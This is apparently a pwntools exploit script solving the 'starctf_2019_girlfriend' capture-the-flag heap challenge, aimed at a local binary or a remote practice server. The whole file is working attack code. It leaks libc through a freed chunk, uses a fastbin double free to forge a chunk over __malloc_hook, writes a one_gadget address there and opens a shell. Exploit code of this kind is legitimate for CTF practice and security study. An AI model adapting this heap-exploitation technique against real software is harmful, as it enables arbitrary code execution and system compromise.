import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./starctf_2019_girlfriend')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./starctf_2019_girlfriend')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29221)
			elf=ELF('./starctf_2019_girlfriend')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c):
			io.sendlineafter('Input your choice:','1')
			io.sendlineafter("Please input the size of girl's name",str(a))
			io.sendafter('please inpute her name:',b)
			io.sendafter('please input her call:',c)

		def delete(a):
			io.sendlineafter('Input your choice:','4')
			io.sendlineafter('Please input the index:',str(a))

		def show(a):
			io.sendlineafter('Input your choice:','2')
			io.sendlineafter('Please input the index:',str(a))
			data=io.recvline()



		add(0xf8,'aaaa','1111')
		add(0x18,'/bin/sh\x00','0x68')
		add(0x68,'aaaa','1111')
		add(0x68,'aaaa','1111')
		delete(0)
		show(0)
		libc_base=u64(io.recv(12)[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		add(0xd8,'aaaa','106')
		delete(2)
		delete(3)
		delete(2)
		show(2)
		heap_base=u64(io.recv(12)[-6:]+'\x00\x00')>>12<<12
		add(0x68,p64(libc.sym['__malloc_hook']-0x23),'1111')
		add(0x68,p64(libc.sym['__malloc_hook']-0x23)+'\x00'*0x30+p64(0x31),'1111')
		add(0x68,p64(libc.sym['__malloc_hook']-0x23)+'\x00'*0x30+p64(0x31),'1111')
		add(0x68,'\x00'*0x13+p64(libc_base+one_gadgaet[2]),'1')
		delete(1)
		delete(1)
		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue